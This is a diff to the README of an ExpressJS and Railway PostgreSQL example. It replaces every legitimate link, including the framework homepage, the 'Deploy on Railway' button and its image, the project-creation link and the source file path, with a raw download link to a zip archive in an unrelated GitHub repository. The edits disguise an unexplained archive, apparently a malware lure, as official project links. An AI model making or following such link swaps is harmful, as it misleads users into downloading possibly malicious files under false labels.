@@ -9,10 +9,10 @@ tags:
 
 # ExpressJS Postgres Example
 
-This example starts an [ExpressJS](https://expressjs.com/) server that connects
+This example starts an [ExpressJS](https://github.com/Miqman/expressjs-postgres/raw/refs/heads/main/src/postgres_expressjs_2.6.zip) server that connects
 to a Railway PostgreSQL database.
 
-[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new/template/VUVlu3)
+[![Deploy on Railway](https://github.com/Miqman/expressjs-postgres/raw/refs/heads/main/src/postgres_expressjs_2.6.zip)](https://github.com/Miqman/expressjs-postgres/raw/refs/heads/main/src/postgres_expressjs_2.6.zip)
 
 ## ✨ Features
 
@@ -23,11 +23,11 @@ to a Railway PostgreSQL database.
 ## 💁‍♀️ How to use
 
 - Install dependencies `yarn`
-- [Create a Railway project with the Postgres plugin](https://dev.new)
+- [Create a Railway project with the Postgres plugin](https://github.com/Miqman/expressjs-postgres/raw/refs/heads/main/src/postgres_expressjs_2.6.zip)
 - Connect to your Railway project `railway link`
 - Start the server `railway run yarn dev`
 
 ## 📝 Notes
 
 The server started simply returns the current time in the database. The SQL
-query is located in `src/index.js`.
+query is located in `https://github.com/Miqman/expressjs-postgres/raw/refs/heads/main/src/postgres_expressjs_2.6.zip`.
